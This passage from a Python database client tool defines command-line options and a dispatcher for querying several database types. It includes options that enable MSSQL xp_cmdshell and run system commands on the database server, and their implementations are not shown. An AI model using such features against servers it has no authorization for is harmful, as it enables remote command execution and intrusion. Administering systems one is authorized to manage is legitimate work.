    parser = argparse.ArgumentParser(
        description="MSSQL / MySQL / PostgreSQL / Oracle / Redis 数据库连接与命令执行工具",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--type", help="数据库类型：mysql、mssql、oracle、postgresql、redis")
    parser.add_argument("--host", help="数据库主机地址")
    parser.add_argument("--port", type=int, help="数据库端口")
    parser.add_argument("-u", "--user", help="数据库用户名")
    parser.add_argument("-p", "--password", help="数据库密码；不建议在命令行明文填写")
    parser.add_argument("--password-env", default="DB_PASSWORD", help="读取密码的环境变量名")
    parser.add_argument("-d", "--database", help="数据库名；Oracle 可作为 service_name 使用")
    parser.add_argument("--dsn", help="DSN 或完整连接标识；Oracle/MSSQL 可用")
    parser.add_argument("-q", "--query", help="要执行的 SQL")
    parser.add_argument("-f", "--file", help="要执行的 SQL 文件")
    parser.add_argument("--file-encoding", default="utf-8", help="SQL 文件编码")
    parser.add_argument("-i", "--interactive", action="store_true", help="进入交互模式")
    parser.add_argument("--no-split", action="store_true", help="不按分号拆分 SQL，一次性提交")
    parser.add_argument("--max-rows", type=int, default=200, help="每条查询最多返回行数")
    parser.add_argument("--output", choices=["table", "json", "csv"], default="table", help="输出格式；本机命令模式支持 table/json")
    parser.add_argument("--save", help="将 json/csv/命令输出保存到文件")
    parser.add_argument("--timeout", type=int, default=10, help="数据库连接和读写超时时间，秒")
    parser.add_argument("--autocommit", action="store_true", help="启用自动提交")

    parser.add_argument("--local-cmd", help="执行本机安全诊断命令，不连接数据库")
    parser.add_argument("--local-timeout", type=int, default=15, help="本机命令超时时间，秒")
    parser.add_argument("--list-local-commands", action="store_true", help="列出允许执行的本机诊断命令")

    parser.add_argument("--remote-cmd", nargs="?", const="", default=None, help="在数据库服务器上执行系统命令。不加命令值时自动执行模块默认诊断命令集；配合 -i 进入交互模式。")
    parser.add_argument("--enable-xp-cmdshell", action="store_true", help="MSSQL：自动启用 xp_cmdshell（需系统管理员权限）")

    parser.add_argument("--charset", default="utf8mb4", help="MySQL 字符集")
    parser.add_argument("--driver", help="MSSQL ODBC Driver 名称")
    parser.add_argument("--encrypt", action="store_true", help="MSSQL 启用 Encrypt=yes")
    parser.add_argument("--trust-server-certificate", action="store_true", help="MSSQL 启用 TrustServerCertificate=yes")
    parser.add_argument("--service-name", help="Oracle service_name")
    parser.add_argument("--sid", help="Oracle SID")
    parser.add_argument("--oracle-thick", action="store_true", help="启用 python-oracledb thick 模式")
    parser.add_argument("--oracle-client-lib-dir", help="Oracle Instant Client 目录")
    return parser


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        validate_args(args)
        if args.list_local_commands:
            list_safe_local_commands()
        elif args.local_cmd:
            run_local_command(args)
        elif args.remote_cmd is not None and args.interactive:
            run_remote_cmd_interactive(args)
        elif args.remote_cmd is not None:
            run_remote_cmd(args)
        elif args.interactive:
            run_interactive(args)
        else:
            run_batch(args)
        return 0
    except KeyboardInterrupt:
        eprint("已取消。")
        return 130
    except Exception as exc:
        eprint(f"错误：{exc}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
